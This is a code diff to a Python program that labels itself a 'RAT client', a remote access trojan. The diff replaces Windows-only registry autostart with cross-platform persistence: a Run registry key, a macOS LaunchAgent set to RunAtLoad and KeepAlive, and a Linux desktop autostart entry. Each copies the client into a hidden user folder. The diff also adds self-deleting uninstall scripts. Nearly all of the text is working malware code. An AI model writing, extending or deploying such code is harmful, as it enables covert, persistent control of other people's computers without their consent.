@@ -216,81 +216,208 @@ def show_message_box(text: str) -> str:
     except Exception as e:
         return f"Fehler beim Anzeigen der Nachrichtenbox: {e}"
 
-# === Persistenz & Deinstallation ===
-def manage_persistence(enable=True) -> str:
-    """Verwaltet die Persistenz des Clients (nur Windows)."""
-    if platform.system() != "Windows":
-        return "Persistenz wird nur unter Windows unterstützt."
-    
+# === Persistence & Uninstallation ===
+def _get_script_path():
+    """Determines the path of the script, handling frozen executables."""
+    if getattr(sys, 'frozen', False):
+        # The application is frozen
+        return sys.executable
+    else:
+        # The application is not frozen
+        # Return the real path of the script
+        return os.path.realpath(__file__)
+
+def _manage_persistence_windows(enable=True) -> str:
+    """Manages persistence on Windows using the Registry."""
     try:
-        # Robusterer Pfad für die ausführbare Datei
+        # In Windows, sys.executable is the path to the python.exe or the frozen .exe
         exe_path = sys.executable
-        # Zielpfad im AppData-Verzeichnis, um Berechtigungsprobleme zu vermeiden
         dest_folder = os.path.join(os.environ["APPDATA"], PERSISTENCE_NAME)
         dest_path = os.path.join(dest_folder, f"{PERSISTENCE_NAME}.exe")
-
-        # Registry-Schlüssel für den Autostart
         reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        
+
         if enable:
-            # 1. Kopiere die ausführbare Datei an einen stabilen Ort
             os.makedirs(dest_folder, exist_ok=True)
-            shutil.copyfile(exe_path, dest_path)
+            # Only copy if the script is not already in the destination
+            if os.path.realpath(exe_path).lower() != os.path.realpath(dest_path).lower():
+                shutil.copyfile(exe_path, dest_path)
             
-            # 2. Erstelle den Registry-Eintrag
-            # Verwendung von 'reg' anstelle von 'winreg' für Einfachheit
             cmd = f'reg add HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /t REG_SZ /d "{dest_path}" /f'
-            subprocess.run(cmd, shell=True, check=True, capture_output=True)
-            return f"Persistenz aktiviert. Client startet bei der nächsten Anmeldung von '{dest_path}'."
+            subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
+            return f"Persistence enabled. Client will start on next login from '{dest_path}'."
         else:
-            # 1. Entferne den Registry-Eintrag
             cmd = f'reg delete HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /f'
-            subprocess.run(cmd, shell=True, check=True, capture_output=True)
-            
-            # 2. (Optional) Entferne die kopierte Datei
+            # Run and ignore errors if the key doesn't exist
+            subprocess.run(cmd, shell=True, check=False, capture_output=True, text=True)
             if os.path.exists(dest_path):
                 try:
+                    # Attempt to kill process before deleting
+                    subprocess.run(f"taskkill /f /im {os.path.basename(dest_path)}", shell=True, check=False, capture_output=True)
                     os.remove(dest_path)
                     os.rmdir(dest_folder)
                 except OSError as e:
-                    return f"Persistenz-Registry-Eintrag entfernt, aber die Datei '{dest_path}' konnte nicht gelöscht werden: {e}"
-            return "Persistenz erfolgreich entfernt."
-
+                    return f"Persistence registry entry removed, but could not delete file '{dest_path}': {e}"
+            return "Persistence successfully removed."
     except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
-        return f"Fehler bei der Persistenzverwaltung: {e}"
+        return f"Error managing Windows persistence: {e.stderr if hasattr(e, 'stderr') else e}"
     except Exception as e:
-        return f"Ein unerwarteter Fehler ist aufgetreten: {e}"
+        return f"An unexpected error occurred during Windows persistence: {e}"
+
+def _manage_persistence_macos(enable=True) -> str:
+    """Manages persistence on macOS using LaunchAgents."""
+    try:
+        script_path = _get_script_path()
+        plist_name = f"com.{PERSISTENCE_NAME.lower()}.plist"
+        plist_dir = os.path.join(os.path.expanduser("~"), "Library", "LaunchAgents")
+        plist_path = os.path.join(plist_dir, plist_name)
+        
+        dest_dir = os.path.join(os.path.expanduser("~"), f".{PERSISTENCE_NAME}")
+        dest_path = os.path.join(dest_dir, os.path.basename(script_path) if not getattr(sys, 'frozen', False) else PERSISTENCE_NAME)
+
+        if enable:
+            os.makedirs(dest_dir, exist_ok=True)
+            if os.path.realpath(script_path).lower() != os.path.realpath(dest_path).lower():
+                shutil.copy(script_path, dest_path)
+            os.chmod(dest_path, 0o755)
+
+            plist_content = f"""
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>{plist_name}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{dest_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            os.makedirs(plist_dir, exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+            
+            subprocess.run(["launchctl", "load", plist_path], check=True, capture_output=True, text=True)
+            return f"Persistence enabled via LaunchAgent: {plist_path}"
+        else:
+            if os.path.exists(plist_path):
+                subprocess.run(["launchctl", "unload", plist_path], check=False, capture_output=True, text=True)
+                os.remove(plist_path)
+            if os.path.exists(dest_path):
+                shutil.rmtree(dest_dir, ignore_errors=True)
+            return "Persistence successfully removed."
+    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
+        return f"Error managing macOS persistence: {e.stderr if hasattr(e, 'stderr') else e}"
+    except Exception as e:
+        return f"An unexpected error occurred during macOS persistence: {e}"
+
+def _manage_persistence_linux_autostart(enable=True) -> str:
+    """Manages persistence on Linux using XDG Autostart (for desktop environments)."""
+    try:
+        script_path = _get_script_path()
+        autostart_dir = os.path.join(os.path.expanduser("~"), ".config", "autostart")
+        desktop_file_path = os.path.join(autostart_dir, f"{PERSISTENCE_NAME.lower()}.desktop")
+
+        dest_dir = os.path.join(os.path.expanduser("~"), f".{PERSISTENCE_NAME}")
+        dest_path = os.path.join(dest_dir, os.path.basename(script_path) if not getattr(sys, 'frozen', False) else PERSISTENCE_NAME)
+
+        if enable:
+            os.makedirs(dest_dir, exist_ok=True)
+            if os.path.realpath(script_path).lower() != os.path.realpath(dest_path).lower():
+                shutil.copy(script_path, dest_path)
+            os.chmod(dest_path, 0o755)
+
+            desktop_entry = f"""
+[Desktop Entry]
+Type=Application
+Name={PERSISTENCE_NAME}
+Exec=env python3 "{dest_path}"
+StartupNotify=false
+Terminal=false
+"""
+            os.makedirs(autostart_dir, exist_ok=True)
+            with open(desktop_file_path, "w") as f:
+                f.write(desktop_entry)
+            return f"Persistence enabled via Autostart: {desktop_file_path}"
+        else:
+            if os.path.exists(desktop_file_path):
+                os.remove(desktop_file_path)
+            if os.path.exists(dest_dir):
+                shutil.rmtree(dest_dir, ignore_errors=True)
+            return "Persistence successfully removed."
+    except (FileNotFoundError, PermissionError) as e:
+        return f"Error managing Linux autostart persistence: {e}"
+    except Exception as e:
+        return f"An unexpected error occurred during Linux autostart persistence: {e}"
+
+def manage_persistence(enable=True) -> str:
+    """Manages client persistence across Windows, macOS, and Linux."""
+    system = platform.system()
+    if system == "Windows":
+        return _manage_persistence_windows(enable)
+    elif system == "Darwin":
+        return _manage_persistence_macos(enable)
+    elif system == "Linux":
+        # Simple check for desktop environment.
+        if os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"):
+             return _manage_persistence_linux_autostart(enable)
+        else:
+             return "Linux persistence is only supported in desktop environments (via .desktop files)."
+    else:
+        return f"Persistence is not supported on this OS: {system}."
 
 def uninstall_client() -> str:
-    """Deinstalliert den Client vollständig (nur Windows)."""
-    if platform.system() != "Windows":
-        return "Deinstallation wird nur unter Windows unterstützt."
-    
+    """Removes persistence and schedules the client for self-deletion."""
     try:
-        # 1. Persistenz entfernen
+        # 1. Remove persistence across all platforms
         persistence_msg = manage_persistence(enable=False)
         
-        # 2. Erstelle ein Batch-Skript, das den Client löscht und sich selbst zerstört
-        client_path = sys.executable
-        batch_content = f"""
+        # 2. Self-deletion logic
+        client_path = _get_script_path()
+        
+        if platform.system() == "Windows":
+            # Use a batch script for deletion
+            batch_content = f"""
 @echo off
-echo "Deinstalliere RAT-Client..."
+echo "Uninstalling RAT client..."
 timeout /t 3 /nobreak > NUL
-taskkill /f /im {os.path.basename(client_path)} > NUL
+taskkill /f /im "{os.path.basename(client_path)}" > NUL
 del "{client_path}"
 del "%~f0"
 """
-        batch_path = os.path.join(os.environ["TEMP"], "uninstall.bat")
-        with open(batch_path, "w") as f:
-            f.write(batch_content)
+            batch_path = os.path.join(os.environ["TEMP"], "uninstall.bat")
+            with open(batch_path, "w") as f:
+                f.write(batch_content)
             
-        # 3. Führe das Batch-Skript in einem neuen Prozess aus
-        subprocess.Popen(f'"{batch_path}"', shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
-        
-        return f"{persistence_msg}\nDeinstallationsprozess gestartet. Der Client wird in Kürze beendet und gelöscht."
+            subprocess.Popen(f'"{batch_path}"', shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+            
+        else: # Linux and macOS
+            # Use a shell script for deletion
+            script_content = f"""
+#!/bin/sh
+echo "Uninstalling RAT client..."
+sleep 3
+kill -9 {os.getpid()}
+rm -f "{client_path}"
+rm -- "$0"
+"""
+            script_path = os.path.join(os.path.expanduser("~"), ".uninstall.sh")
+            with open(script_path, "w") as f:
+                f.write(script_content)
+            
+            os.chmod(script_path, 0o755)
+            subprocess.Popen([script_path], shell=True)
+
+        return f"{persistence_msg}\nUninstallation process started. The client will be terminated and deleted shortly."
 
     except Exception as e:
-        return f"Fehler bei der Deinstallation: {e}"
+        return f"Error during uninstallation: {e}"
+
 
 # === Datei- und Verzeichnisfunktionen ===
 def list_directory(path=".") -> str:
